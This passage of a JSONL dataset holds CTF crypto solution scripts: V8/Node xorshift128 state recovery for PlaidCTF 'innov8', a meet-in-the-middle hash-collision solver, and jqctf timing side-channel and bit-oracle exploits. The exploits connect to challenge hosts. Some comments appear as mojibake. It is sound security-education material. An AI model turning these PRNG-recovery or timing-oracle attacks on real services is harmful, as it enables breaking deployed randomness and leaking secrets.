0x917E8E + 23] = b\"\\x48\\x89\\xc8\"  # mov rax, rcx\n\nnode[0x127497A : 0x127497A + 10] = b\"\\x49\\xbe\" + p64(s0)  # mov r14, s0\nnode[0x127497A + 10 : 0x127497A + 20] = b\"\\x48\\xb9\" + p64(s1)  # mov rcx, s1\nnode[0x127497A + 20 : 0x127497A + 23] = b\"\\x90\" * 3\n\nd8_patched = tempfile.NamedTemporaryFile(delete=False)\nd8_patched.write(bytes(d8))\nd8_patched.close()\nos.chmod(d8_patched.name, 0o755)\n\nnode_patched = tempfile.NamedTemporaryFile(delete=False)\nnode_patched.write(bytes(node))\nnode_patched.close()\nos.chmod(node_patched.name, 0o755)\n\nd8_output = subprocess.check_output([d8_patched.name, \"gen2.js\", \"--\", str(maximum)])\nd8_ints = [int(i) for i in d8_output.strip().split()]\nnode_output = subprocess.check_output([node_patched.name, \"gen2.js\", str(maximum)])\nnode_ints = [int(i) for i in node_output.strip().split()]\nos.remove(d8_patched.name)\nos.remove(node_patched.name)\n\nmismatches = 0\nassert len(d8_ints) == len(node_ints) == 112\nfor x, y in zip(d8_ints, node_ints):\n    if x != y:\n        mismatches += 1\nprint(f\"mismatches: {mismatches}\")\nif mismatches >= 104:\n    print(\"good!\")\n    print(open(\"flag.txt\").read().strip())\nelse:\n    print(\"not good\")\n", "name": "chall2"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\PlaidCTF\\innov8\\level2\\exp_final.py", "category": "crypto", "solution_code": "from sage.all import BooleanPolynomialRing, PolynomialRing, GF, Integer, ZZ, Sequence, vector, save, load\nfrom tqdm import trange, tqdm\nimport struct\nfrom math import floor\nimport random\nimport itertools\n\nclass xorshift128:\n    def __init__(self, seed0, seed1):\n        self.state0 = seed0\n        self.state1 = seed1\n        self.mask = 2**64 - 1\n\n    def next(self):\n        s1 = self.state0\n        s0 = self.state1\n        self.state0 = s0\n        s1 ^= (s1 << 23)\n        s1 &= self.mask\n        s1 ^= (s1 >> 17)\n        s1 &= self.mask\n        s1 ^= s0\n        s1 ^= (s0 >> 26)\n        s1 &= self.mask\n        self.state1 = s1\n    \n    def next_double1(self):\n        # used in nodejs\n        # https://github.com/nodejs/node/blob/7e43337fdd73f3b4d5b49ca7eb7012b0bf6ed6b4/deps/v8/src/base/utils/random-number-generator.h#L111\n        self.next()\n        double_bits = (self.state0 >> 12) | 0x3FF0000000000000\n        double = struct.unpack('d', struct.pack('<Q', double_bits))[0] - 1\n        return double\n    \n    def next_double2(self):\n        # used in v8\n        # https://github.com/v8/v8/blob/2f2bcbae2ec348b0b9f293c74f622149fe60c248/src/base/utils/random-number-generator.h#L111\n        self.next()\n        double = float(self.state0 >> 11) * (1 / (0x1 << 53))\n        # double = float(self.state0 & 0x1FFFFFFFFFFFFF) / (0x1 << 53)\n        return double\n    \nboolean_poly_ring = BooleanPolynomialRing(128, 'x')\nl_shift = lambda xs, n: xs[n:] + [boolean_poly_ring(0)] * n\nr_shift = lambda xs, n: [boolean_poly_ring(0)] * n + xs[:-n]\nxor = lambda xs, ys: [x + y for x, y in zip(xs, ys)]\n\ndef symbolic_xorshift128(se_state0, se_state1):\n    assert len(se_state0) == 64 and len(se_state1) == 64\n    se_s1 = se_state0\n    se_s0 = se_state1\n    se_state0 = se_s0\n    se_s1 = xor(se_s1, l_shift(se_s1, 23))\n    se_s1 = xor(se_s1, r_shift(se_s1, 17))\n    se_s1 = xor(se_s1, se_s0)\n    se_s1 = xor(se_s1, r_shift(se_s0, 26))\n    se_state1 = se_s1\n    return se_state0, se_state1\n\n\nxs = boolean_poly_ring.gens()\nse_state0 = list(xs[:64])\nse_state1 = list(xs[64:])\npolys = []\n\nfor i in range(128):\n    se_state0, se_state1 = symbolic_xorshift128(se_state0, se_state1)\n    # make the 12th bit of se_state0 be 1\n    polys.append(se_state0[-12] + boolean_poly_ring(1))\n\n# due to cache stack of size 64 used in node/v8 (first in, last out), the first 112 polys of outputs should be the following:\nall_polys = polys[:64] + polys[64:128][::-1][:112 - 64]\n# choose num_eq polys\nassert len(all_polys) == 112\n\n# we choose 110 out of 112 polys to be satisfied (meanwhile we force the other two being 0 to avoid duplicate checks)\n# actually we have checked the case of 110, 111 and cannot find mismatches >= 104 (but many cases with 103 mismatches)\nnum_eqs = 110 # the number of 1s constrained \n# the polys constrained to 0\nsearch_space = itertools.combinations(list(range(112)), 112 - num_eqs)\nN = 2**52 - 1\n\nfor idxs in search_space:\n    polys = all_polys[:]\n    for idx in idxs:\n        # make it constrained to 0\n        polys[idx] += boolean_poly_ring(1)\n\n    seq = Sequence(polys)\n    mat, mono = seq.coefficients_monomials()\n    b = mat[:, -1]\n    mat = mat[:, :-1].dense_matrix()\n    basis = mat.right_kernel().basis()\n    sol0 = mat.solve_right(vector(b.list()))\n    sols = []\n\n    bf = 2**len(basis)\n    max_mismathes = 0\n\n    for i in trange(bf):\n        sol = sol0 + sum([basis[j] * ((i >> j) & 1) for j in range(len(basis))])\n        s0 = int(''.join([str(x) for x in sol[:64]]), 2)\n        s1 = int(''.join([str(x) for x in sol[64:128]]), 2)\n        prng1 = xorshift128(s0, s1)\n        prng2 = xorshift128(s0, s1)\n        outs1 = []\n        outs2 = []\n        for j in range(128):\n            outs1.append(prng1.next_double1())\n            outs2.append(prng2.next_double2())\n        checked_outs1 = outs1[:64] + outs1[64:][::-1][:112 - 64]\n        checked_outs2 = outs2[:64] + outs2[64:][::-1][:112 - 64]\n        mismathes = 0\n        for c1, c2 in zip(checked_outs1, checked_outs2):\n            N1 = floor(c1 * N)\n            N2 = floor(c2 * N)\n            if N1 != N2:\n                mismathes += 1\n        if mismathes > max_mismathes:\n            max_mismathes = mismathes\n        if mismathes >= 104:\n            print(f\"{i = }, {s0 = }, {s1 = }, {mismathes = }\")\n            input(\"Found a case with 104 mismatches, press enter to continue\")\n# i = 19188, s0 = 16430066307599907648, s1 = 11328760440928705748, mismathes = 104", "name": "exp_final"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\PlaidCTF\\innov8\\level2\\exp_random.py", "category": "crypto", "solution_code": "from sage.all import BooleanPolynomialRing, PolynomialRing, GF, Integer, ZZ, Sequence, vector, save, load\nfrom tqdm import trange, tqdm\nimport struct\nfrom math import floor\nimport random\n\nclass xorshift128:\n    def __init__(self, seed0, seed1):\n        self.state0 = seed0\n        self.state1 = seed1\n        self.mask = 2**64 - 1\n\n    def next(self):\n        s1 = self.state0\n        s0 = self.state1\n        self.state0 = s0\n        s1 ^= (s1 << 23)\n        s1 &= self.mask\n        s1 ^= (s1 >> 17)\n        s1 &= self.mask\n        s1 ^= s0\n        s1 ^= (s0 >> 26)\n        s1 &= self.mask\n        self.state1 = s1\n    \n    def next_double1(self):\n        # used in nodejs\n        # https://github.com/nodejs/node/blob/7e43337fdd73f3b4d5b49ca7eb7012b0bf6ed6b4/deps/v8/src/base/utils/random-number-generator.h#L111\n        self.next()\n        double_bits = (self.state0 >> 12) | 0x3FF0000000000000\n        double = struct.unpack('d', struct.pack('<Q', double_bits))[0] - 1\n        return double\n    \n    def next_double2(self):\n        # used in v8\n        # https://github.com/v8/v8/blob/2f2bcbae2ec348b0b9f293c74f622149fe60c248/src/base/utils/random-number-generator.h#L111\n        self.next()\n        double = float(self.state0 >> 11) * (1 / (0x1 << 53))\n        # double = float(self.state0 & 0x1FFFFFFFFFFFFF) / (0x1 << 53)\n        return double\n\nboolean_poly_ring = BooleanPolynomialRing(128, 'x')\n\nl_shift = lambda xs, n: xs[n:] + [boolean_poly_ring(0)] * n\nr_shift = lambda xs, n: [boolean_poly_ring(0)] * n + xs[:-n]\nxor = lambda xs, ys: [x + y for x, y in zip(xs, ys)]\n\nxs = boolean_poly_ring.gens()\nse_state0 = list(xs[:64])\nse_state1 = list(xs[64:])\npolys = []\n\nfor i in range(128):\n    se_s1 = se_state0\n    se_s0 = se_state1\n    se_state0 = se_s0\n    se_s1 = xor(se_s1, l_shift(se_s1, 23))\n    se_s1 = xor(se_s1, r_shift(se_s1, 17))\n    se_s1 = xor(se_s1, se_s0)\n    se_s1 = xor(se_s1, r_shift(se_s0, 26))\n    se_state1 = se_s1\n    # polys.append(se_state0[-12] + boolean_poly_ring(1))\n    polys.append(se_state0[-12] + boolean_poly_ring(1))\n    \n\nall_polys = polys[:64] + polys[64:128][::-1][:112 - 64]\n# choose num_eq polys\nassert len(all_polys) == 112\nnum_eqs = 110\nchecked_poly = {}\n\nwhile True:\n    polys = all_polys[:]\n    idxs = random.sample(range(112), 2)\n    for idx in idxs:\n        # make it constrained to 0\n        polys[idx] += boolean_poly_ring(1)\n    if tuple(polys) in checked_poly:\n        continue\n    else:\n        checked_poly[tuple(polys)] = True\n\n    seq = Sequence(polys)\n    mat, mono = seq.coefficients_monomials()\n\n    b = mat[:, -1]\n    mat = mat[:, :-1].dense_matrix()\n    basis = mat.right_kernel().basis()\n    print(f\"{len(basis) = }\")\n    sol0 = mat.solve_right(vector(b.list()))\n    sols = []\n\n    bf = 2**len(basis)\n    N = 2**52 - 1\n    max_mismathes = 0\n\n    for i in trange(bf):\n        sol = sol0 + sum([basis[j] * ((i >> j) & 1) for j in range(len(basis))])\n        # sol = [int(x) for x in sol]\n        s0 = int(''.join([str(x) for x in sol[:64]]), 2)\n        s1 = int(''.join([str(x) for x in sol[64:128]]), 2)\n        prng1 = xorshift128(s0, s1)\n        prng2 = xorshift128(s0, s1)\n        outs1 = []\n        outs2 = []\n        for j in range(128):\n            outs1.append(prng1.next_double1())\n            outs2.append(prng2.next_double2())\n        checked_outs1 = outs1[:64] + outs1[64:][::-1][:112 - 64]\n        checked_outs2 = outs2[:64] + outs2[64:][::-1][:112 - 64]\n        mismathes = 0\n        for c1, c2 in zip(checked_outs1, checked_outs2):\n            # assert c2 - c1 == 1/2**53, f\"{c2 - c1 = }\"\n            N1 = floor(c1 * N)\n            N2 = floor(c2 * N)\n            if N1 != N2:\n                mismathes += 1\n        if mismathes > max_mismathes:\n            max_mismathes = mismathes\n            print(f\"{i = }, {s0 = }, {s1 = }, {mismathes = }\")\n        if mismathes >= 104:\n            input(\"Found a case with 104 mismatches, press enter to continue\")", "name": "exp_random"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\PlaidCTF\\innov8\\level2\\get_flag.py", "category": "crypto", "solution_code": "from pwn import remote\n\n# nc innov8-enerv8.chal.pwni.ng 1337\n\nio = remote(\"innov8-enerv8.chal.pwni.ng\", 1337)\ns0 = 17263521175733561678\ns1 = 1049317583000366139\nN = 2**52 - 1\n\nio.sendlineafter(b\"part 1: \", b\"oaq1MD92evRsDZvH\")\nio.sendlineafter(b\"s0: \", str(s0).encode())\nio.sendlineafter(b\"s1: \", str(s1).encode())\nio.sendlineafter(b\"maximum: \", str(N).encode())\nio.interactive()\n", "name": "get_flag"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\n1ctf\\n1fnv1\\exp.py", "category": "crypto", "solution_code": "import os, secrets, signal\nfrom collections import deque\nfrom math import ceil, log2, gcd\nfrom pwn import remote, process\nfrom tqdm import tqdm\n\ndef hash(params, msg):\n    a, b, c, m, x = params\n    for byte in msg:\n        for bit in f'{byte:08b}':\n            x = ((x * a + b + int(bit)) ^ c) % m\n    return x\n\ndef hash_bits(params, bits):\n    a, b, c, m, x = params\n    for bit in bits:\n        x = ((x * a + b + int(bit)) ^ c) % m\n    return x\n\n# Global variables for optimization\nGLOBAL_A = None\nGLOBAL_B = None\nGLOBAL_C = None\nGLOBAL_M = None\nGLOBAL_TARGET = None\nGLOBAL_A_INV_CACHE = {}  # Cache for modular inverses at different bit widths\n\n\ndef forward_step(x_init, nbit, steps, valid_paths):\n    \"\"\" Generate all forward states after 'steps' using valid_paths, which is used in mitm\n    \"\"\"\n    a, b, c, m = GLOBAL_A, GLOBAL_B, GLOBAL_C, GLOBAL_M\n    mod_mask = (1 << nbit) - 1\n    n_choices = len(valid_paths)\n    deque_states = deque()\n    deque_states.append((x_init & mod_mask, []))\n    while deque_states:\n        state, path = deque_states.popleft()\n        if len(path) == steps:\n            yield (state, path)\n            continue\n        for idx in range(n_choices):\n            new_state = state\n            new_path = path + [idx]\n            for bit in valid_paths[idx]:\n                new_state = ((new_state * a + b + bit) ^ c) & mod_mask\n            deque_states.append((new_state, new_path))\n            \ndef backward_step(state_target, nbit, steps, valid_paths):\n    \"\"\" Generate all backward states after 'steps' using valid_paths, which is used in mitm\n    \"\"\"\n    a, b, c, m = GLOBAL_A, GLOBAL_B, GLOBAL_C, GLOBAL_M\n    mod_mask = (1 << nbit) - 1\n    \n    # Compute modular inverse of a modulo 2^nbit (a is odd, so inverse exists)\n    if nbit not in GLOBAL_A_INV_CACHE:\n        GLOBAL_A_INV_CACHE[nbit] = pow(a, -1, 1 << nbit)\n    a_inv = GLOBAL_A_INV_CACHE[nbit]\n    \n    def inv_step(state, bit):\n        \"\"\"Inverse of: next = ((prev * a + b + bit) ^ c) mod 2^nbit\"\"\"\n        # By adding m before the final modulo, we prevent Python from\n        # dealing with negative numbers in a slow way.\n        return (((state ^ c) - b - bit) * a_inv + m) & mod_mask\n    \n    n_choices = len(valid_paths)\n    deque_states = deque()\n    deque_states.append((state_target & mod_mask, []))\n    while deque_states:\n        state, path = deque_states.popleft()\n        if len(path) == steps:\n            yield (state, path)\n            continue\n        for idx in range(n_choices):\n            new_state = state\n            new_path = [idx] + path\n            for bit in reversed(valid_paths[idx]):\n                new_state = inv_step(new_state, bit)\n            deque_states.append((new_state, new_path))\n\n\ndef find_lsb_path_mitm(x_init, nbit, steps, valid_paths=None, findall=True):\n    \"\"\"\n    Optimized meet-in-the-middle approach for arbitrary valid_paths.\n    Uses global parameters for better performance.\n    Much faster than BFS for large step counts - O(N^(steps/2)) instead of O(N^steps).\n    where N is the number of valid_paths.\n    \"\"\"\n    global GLOBAL_A, GLOBAL_B, GLOBAL_C, GLOBAL_M, GLOBAL_TARGET, GLOBAL_A_INV_CACHE\n    \n    a, b, c, m, target = GLOBAL_A, GLOBAL_B, GLOBAL_C, GLOBAL_M, GLOBAL_TARGET\n    mod_mask = (1 << nbit) - 1\n    \n    # Default to binary choices if not specified\n    if valid_paths is None:\n        valid_paths = [[0], [1]]\n    \n    n_choices = len(valid_paths)\n    stride = len(valid_paths[0])  # Length of each path segment\n    \n    # Split steps into two halves\n    k = steps // 2\n    r = steps - k\n    \n    print(f\"[MITM] Forward: {k} steps, Backward: {r} steps (total: {steps}), {n_choices} choices, stride: {stride}\")\n    \n    # Forward phase: compute all states after k steps\n    # Map: state -> list of (path_indices_tuple)\n    forward = {}\n    total_forward = n_choices ** k\n    \n    if total_forward > 1000000:\n        print(f\"[MITM] Warning: Forward phase has {total_forward} combinations, this may be slow...\")\n    \n    for state, path in tqdm(forward_step(x_init, nbit, k, valid_paths), total=total_forward, desc=\"[MITM] Forward phase\"):\n        path_indices = tuple(path)\n        if state not in forward:\n            forward[state] = []\n        forward[state].append(path_indices)\n    print(f\"[MITM] Forward phase done: {len(forward)} unique states\")\n    \n    # Backward phase: search for collisions\n    total_backward = n_choices ** r\n    results = []\n    for state, path_indices in tqdm(backward_step(target, nbit, r, valid_paths), total=total_backward, desc=\"[MITM] Backward phase\"):\n        if state in forward:\n            # Reconstruct full path\n            for path_indices1 in forward[state]:\n                full_path_indices = list(path_indices1) + list(path_indices)\n                full_path = []\n                for idx in full_path_indices:\n                    full_path.extend(valid_paths[idx])\n                if findall:\n                    results.append(full_path)\n                else:\n                   ", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\n1ctf\\n1fnv1\\server.py", "category": "crypto", "solution_code": "import os, secrets, signal\n\ndef hash(params, msg):\n    a, b, c, m, x = params\n    for byte in msg:\n        for bit in f'{byte:08b}':\n            x = ((x * a + b + int(bit)) ^ c) % m\n    return x\n\nnbits = 128\nrand = lambda: secrets.randbits(nbits)\nprint('âš™ï¸', params := (rand() | 1, rand(), rand(), 2 ** nbits, rand()))\nprint('ðŸŽ¯', target := rand())\n\nsignal.alarm(900)\nmessage = bytes.fromhex(input('ðŸ’¬ '))\nassert hash(params, message) == target, 'âŒ'\nprint('ðŸš©', os.getenv(\"FLAG\"))\n", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\jqctf\\one-line-crypto\\exp.py", "category": "crypto", "solution_code": "from pwn import remote, process, context\nimport time\nimport os\nfrom sage.all import crt, prod\nimport random\nfrom Crypto.Util.number import long_to_bytes\n# context.log_level = \"debug\"\n\nlocal = True\nif local:\n    io = process([\"sage\", \"server.sage\"], env={\"HOME\": os.environ[\"HOME\"], \"FLAG\": \"flag{0123qwert45}\"}, stderr=process.STDOUT)\nelse:\n    io = remote(\"39.106.16.204\", 24045)\n\nprimes_le_103 = [\n    2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43,\n    47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101\n]\n\ndef server_side_channel_oracle(input_num, n_estimate = 100, time_threshold = 0.5):\n    st = time.time()\n    io.sendlines([str(input_num).encode()] * n_estimate)\n    io.recvuntil(\"ðŸŒŒ \".encode() * n_estimate)\n    et = time.time()\n    cost = et - st\n    return cost > time_threshold\n\ndef sample_mod_r_mod_p(r, p, bit_length = 32, start_bit = 17 * 8):\n    assert p != 2, \"cannot handle the case p=2\"\n    while True:\n        randnum = random.getrandbits(bit_length) << start_bit\n        if randnum % p == r:\n            yield randnum\n\ndef recover_flag(primes, n_sample = 100):\n    moduli = {}\n    for p in primes:\n        for k in range(p):\n            count = 0\n            good_k = True\n            for input_num in sample_mod_r_mod_p(k, p):\n                if not server_side_channel_oracle(input_num):\n                    count += 1\n                    if count == n_sample:\n                        break\n                else:\n                    good_k = False\n                    break\n            if good_k:\n                print(f\"p: {p}, k: {k}, r: {(-k) % p}\")\n                moduli[p] = (-k) % p\n                break\n        assert good_k, f\"Failed to find k for prime {p}\"\n    remainders = [moduli[p] for p in primes]\n    x = int(crt(remainders, primes))\n    return x, int(prod(primes))\n\nflag_res, mod = recover_flag(primes_le_103[1:], n_sample=100)\nwhile flag_res < 2**136:\n    flag = long_to_bytes(flag_res)\n    if flag.startswith(b\"flag{\"):\n        print(f\"{flag = }\")\n        break\n    flag_res += mod", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\jqctf\\one-line-crypto\\exp_cmd.py", "category": "crypto", "solution_code": "from pwn import remote, process, context\nimport time\nimport os\nimport random\nimport sys\n\n# context.log_level = \"debug\"\n\nlocal = False\nif local:\n    io = process([\"sage\", \"server.sage\"], env={\"HOME\": os.environ[\"HOME\"], \"FLAG\": \"flag{0123qwert45}\"}, stderr=process.STDOUT)\nelse:\n    # 39.106.16.204:24045\n    io = remote(\"39.106.16.204\", 24045)\n\n# 50 0.2\n# 100 0.5\n# 50 0.3\ndef server_side_channel_oracle(input_num, n_estimate = 50, time_threshold = 0.3):\n    st = time.time()\n    io.sendlines([str(input_num).encode()] * n_estimate)\n    io.recvuntil(\"ðŸŒŒ \".encode() * n_estimate)\n    et = time.time()\n    cost = et - st\n    return cost > time_threshold\n\ndef sample_mod_r_mod_p(r, p, bit_length = 32, start_bit = 17 * 8):\n    assert p != 2, \"cannot handle the case p=2\"\n    while True:\n        randnum = random.getrandbits(bit_length) << start_bit\n        if randnum % p == r:\n            yield randnum\n\ndef recover_mod_p(p, n_sample = 100):\n    for k in range(p):\n        count = 0\n        good_k = True\n        for input_num in sample_mod_r_mod_p(k, p):\n            if not server_side_channel_oracle(input_num):\n                count += 1\n                if count == n_sample:\n                    break\n            else:\n                good_k = False\n                break\n        if good_k:\n            print(f\"p: {p}, k: {k}, r: {(-k) % p}\")\n            break\n    assert good_k, f\"Failed to find k for prime {p}\"\n    return (-k) % p\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 3:\n        print(\"Usage: python exp.py <ps> <n_sample>\")\n        sys.exit(1)\n    ps = eval(sys.argv[1])  # e.g., [73,79,83,89,97,101]\n    n_sample = int(sys.argv[2])\n    moduli = {}\n    for p in ps:\n        r = recover_mod_p(p, n_sample)    \n        print(f\"Recovered x = {r} mod {p}\")\n    io.close()", "name": "exp_cmd"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\jqctf\\one-line-crypto\\get_flag.py", "category": "crypto", "solution_code": "from sage.all import crt, prod\nfrom Crypto.Util.number import long_to_bytes\nprimes_le_103 = [\n    2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43,\n    47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101\n]\n\nprimes = [256] + primes_le_103[1:]\nmoduli = {}\nmoduli[256] = ord(\"}\")\nmoduli[3] = 2\nmoduli[5] = 1\nmoduli[7] = 0 # [0, 1]\nmoduli[11] = 7\nmoduli[13] = 1\n\nmoduli[17] = 4\nmoduli[19] = 9\nmoduli[23] = 16\nmoduli[29] = 24\n\nmoduli[31] = 7\nmoduli[37] = 22\nmoduli[41] = 27\nmoduli[43] = 6\n\nmoduli[47] = 39\nmoduli[53] = 16\nmoduli[59] = 40\nmoduli[61] = 13\n\nmoduli[67] = 36\nmoduli[71] = 8\nmoduli[73] = 48\nmoduli[79] = 29\n\nmoduli[83] = 66\nmoduli[89] = 78\nmoduli[97] = 53\nmoduli[101] = 65\n\nprimes = list(moduli.keys())\nremainders = [moduli[p] for p in primes]\n# remainders = [moduli[p] for p in primes]\nflag_res = int(crt(remainders, primes))\nmod = int(prod(primes))\nwhile flag_res < 2**136:\n    flag = long_to_bytes(flag_res)\n    # print(f\"{flag = }\")\n    if flag.startswith(b\"flag{\"):\n        print(f\"{flag = }\")\n        break\n    flag_res += mod", "name": "get_flag"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\jqctf\\one-line-crypto\\local_solver.py", "category": "crypto", "solution_code": "import random\nfrom math import prod\n\nprimes_le_103 = [\n    2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43,\n    47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101\n]\n\ndef server_side_channel_oracle(input_num):\n    flag = b\"flag{0123qwert45}\"\n    flag_num = int(flag.hex(), 16)\n    pp = input_num ^ flag_num\n    for prime in primes_le_103:\n        if pp % prime == 0:\n            return False\n    return True\n\ndef crt(remainders, primes):\n    x = 0\n    product = 1\n    for p in primes:\n        product *= p\n    for a, p in zip(remainders, primes):\n        n = product // p\n        inv = pow(n, -1, p)\n        x += a * inv * n\n    return x % product\n\ndef sample_mod_r_mod_p(r, p, bit_length = 32, start_bit = 136):\n    assert p != 2, \"cannot handle the case p=2\"\n    while True:\n        randnum = random.getrandbits(bit_length) << start_bit\n        if randnum % p == r:\n            yield randnum\n\ndef recover_flag(n_sample = 100):\n    moduli = {}\n    moduli[256] = ord(\"}\")\n    for p in primes_le_103[1:]:\n        for k in range(p):\n            count = 0\n            good_k = True\n            for input_num in sample_mod_r_mod_p(k, p):\n                if not server_side_channel_oracle(input_num):\n                    count += 1\n                    if count == n_sample:\n                        break\n                else:\n                    good_k = False\n                    break\n            if good_k:\n                print(f\"p: {p}, k: {k}, count: {count}\")\n                moduli[p] = (-k) % p\n                break\n\n    primes = [256] + primes_le_103[1:]\n    remainders = [moduli[p] for p in primes]\n    x = crt(remainders, primes)\n    N = int(prod(primes))\n    while x < 2**136:\n        hex_str = hex(x)[2:]\n        if len(hex_str) % 2 != 0:\n            hex_str = '0' + hex_str\n        if b\"flag\" in bytes.fromhex(hex_str):\n            return bytes.fromhex(hex_str).decode('utf-8')\n        x += N\n\nflag = recover_flag()\nprint(\"Recovered Flag:\", flag)", "name": "local_solver"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\jqctf\\one-line-crypto\\time_estimator.py", "category": "crypto", "solution_code": "from pwn import remote, process, context\nimport time\nimport os\nfrom sage.all import crt\n# context.log_level = \"debug\"\n\n# local = False\nlocal = True\n\nif local:\n    io = process([\"sage\", \"server.sage\"], env={\"HOME\": os.environ[\"HOME\"], \"FLAG\": \"flag{0123qwert45}\"}, stderr=process.STDOUT)\nelse:\n    # 39.106.16.204:24045\n    io = remote(\"39.106.16.204\", 24045)\n\nio.recvuntil(\"ðŸŒŒ \".encode())\nmin_time = 1\nmax_time = 0\ntimes = []\nthreshhold = 0.3\nn_estimate = 50\nfor input_num in range(1, 2**10):\n    st = time.time()\n    io.sendlines([str(input_num).encode()] * n_estimate)\n    io.recvuntil(\"ðŸŒŒ \".encode() * n_estimate)\n    et = time.time()\n    # print(f\"Time taken: {et - st} seconds\")\n    cost = et - st\n    if cost < min_time:\n        min_time = cost\n        min_input = input_num\n    if cost > max_time:\n        max_time = cost\n        max_input = input_num\n    if cost > threshhold:\n        print(f\"Input {input_num} took too long: {cost} seconds\")\n    times.append(cost)\n\navg_time = sum(times) / len(times)\nprint(f\"Average time: {avg_time} seconds\")\nprint(f\"Min time: {min_time} seconds for input {min_input}\")\nprint(f\"Max time: {max_time} seconds for input {max_input}\")\nio.close()", "name": "time_estimator"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\jqctf\\r4nd0m\\exp.py", "category": "crypto", "solution_code": "from pwn import remote\nfrom Crypto.Util.number import long_to_bytes\n\ndef get_key_stream(io: remote, errs: list[int]):\n    msg = b\"\\x00\" * 64\n    outs = []\n    for err in errs:\n        io.sendlineafter('ðŸ’¬'.encode(), msg.hex().encode())\n        io.sendlineafter('ðŸ”§'.encode(), str(err).encode())\n        io.recvuntil('ðŸ”’'.encode())\n        enc = io.recvline().strip()\n        outs.append(bytes.fromhex(enc.decode()))\n    return outs\n        \n# -(x^-y) = -(x^(~y + 1))\n# ~(x^(~y + 1)) + 1\nip = '39.106.16.204'\nport = 44623\nio = remote(ip, port)\n\nflag_bit = \"\"\nrecovered = 0\nfor i in range(128 * 8):\n    y1 = recovered + (1 << i)\n    y2 = recovered - (1 << i)\n    inp_pair = [y1, y2]\n    out1, out2 = get_key_stream(io, inp_pair)\n    if out1 != out2:\n        recovered += (1 << i)\n    print(f\"{long_to_bytes(recovered) = }\")\n    if b\"flag{\" in long_to_bytes(recovered):\n        print(f\"found flag: {long_to_bytes(recovered)}\")\n        break", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\jqctf\\r4nd0m\\local_solve.py", "category": "crypto", "solution_code": "# æ¨¡æ‹Ÿ serverï¼Œç»™å®šçœŸå®ž xï¼ŒæŽ¥å—ä¸¤ä¸ªæŸ¥è¯¢å€¼ y1, y2 è¿”å›ž f(x,y1)==f(x,y2) çš„å¸ƒå°”ç»“æžœ\ndef server(x):\n    # è¿”å›žæŸ¥è¯¢å‡½æ•°\n    def query(y1, y2):\n        return abs(x ^ y1) == abs(x ^ y2)\n    return query\n\n# åˆ©ç”¨ä¸Šè¿° Oracle æŸ¥è¯¢é€ä½æ¢å¤ x çš„å‡½æ•°\ndef recover_x(query_func, max_bits=64):\n    \"\"\"\n    query_func: ç”¨äºŽæ¯”è¾ƒ |x^y1| == |x^y2| çš„å‡½æ•°ï¼Œç”± server(x) æä¾›\n    max_bits:   æœ€å¤§æ¯”ç‰¹ä½æ•°é™åˆ¶ï¼ˆä¸ºäº†ç¨‹åºç»ˆæ­¢ï¼Œå¯æ ¹æ®éœ€è¦è®¾ç½®ï¼‰\n    \"\"\"\n    recovered = 0  # å½“å‰å·²æ¢å¤çš„ä½Žä½éƒ¨åˆ† r\n    for i in range(max_bits):\n        # æž„é€ æŸ¥è¯¢ y1 = r + 2^i, y2 = r - 2^i\n        y1 = recovered + (1 << i)\n        y2 = recovered - (1 << i)\n        # è°ƒç”¨æŸ¥è¯¢\n        equal = query_func(y1, y2)\n        # å¦‚æžœè¿”å›ž Falseï¼Œè¯´æ˜Žç¬¬ i ä½ä¸º 1ï¼›å¦åˆ™ä¸º 0\n        if not equal:\n            recovered |= (1 << i)  # å°†ç¬¬ i ä½ç½®ä¸º 1\n    return recovered\n\n# ç¤ºä¾‹ï¼šç”Ÿæˆéšæœº xï¼Œæµ‹è¯•æ¢å¤ç»“æžœ\nimport random\nx_true = random.getrandbits(256)  # éšæœº 20 ä½æ­£æ•´æ•°\nquery = server(x_true)\nx_rec = recover_x(query, max_bits=256)\nprint(f\"çœŸå®ž x = {x_true}, æ¢å¤ x = {x_rec}, åŒ¹é… = {x_true == x_rec}\")", "name": "local_solve"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\jqctf\\r4nd0m\\python_int_xor.py", "category": "crypto", "solution_code": "import random\n\nclass python_int:\n    \n    def __init__(self, value: int):\n        self.value = value\n        self.stored_bits = self.complement_bits(value)\n        self.bit_length = len(self.stored_bits)\n        self.signed = 1 if value < 0 else 0\n        \n    @staticmethod\n    def complement_bits(value: int):\n        bit_length = 1 if value == 0 else value.bit_length()\n        if value < 0:\n            bits = bin((1 << bit_length) + value)[2:].zfill(bit_length)\n        else:\n            bits = bin(value)[2:].zfill(bit_length)\n        return bits\n    \n    @staticmethod\n    def integer_value(bits: str, signed: bool):\n        if signed:\n            return int(bits, 2) - (1 << len(bits))\n        return int(bits, 2)\n    \n    def bits(self, fixed_width: int = None):\n        \"\"\" Returns the stored bits of the number in binary format (the signed bit is not included in the string).\n\n        Args:\n            fixed_width (int, optional): the number of bits aligned. Defaults to None.\n\n        Raises:\n            ValueError: fixed_width must be greater than or equal to the bit length of the number\n\n        Returns:\n            str: the binary representation of the number\n        \"\"\"\n        if fixed_width is None:\n            return self.stored_bits\n        if fixed_width < len(self.stored_bits):\n            raise ValueError(\"fixed_width must be greater than or equal to the bit length of the number\")\n        if 